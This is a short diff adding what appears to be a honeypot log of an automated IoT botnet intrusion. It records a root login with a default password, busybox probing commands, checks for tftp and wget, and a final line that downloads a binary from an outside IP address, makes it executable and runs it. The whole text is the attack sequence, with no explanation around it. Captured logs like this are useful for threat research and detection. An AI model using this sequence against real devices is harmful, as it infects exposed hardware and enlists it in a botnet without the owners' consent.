@@ -1,0 +1,13 @@
+from: 109.105.79.46:54815 user:root password:password
+enable
+system
+shell
+sh
+cat /proc/mounts; /bin/busybox THZVX
+cd /tmp; cat .s || cp /bin/echo .s; /bin/busybox THZVX
+tftp; wget; /bin/busybox THZVX
+dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
+/bin/busybox THZVX
+rm .s; wget http://46.100.250.148:60253/.i; chmod 777 .i; ./.i; exit
+q
+[eof]
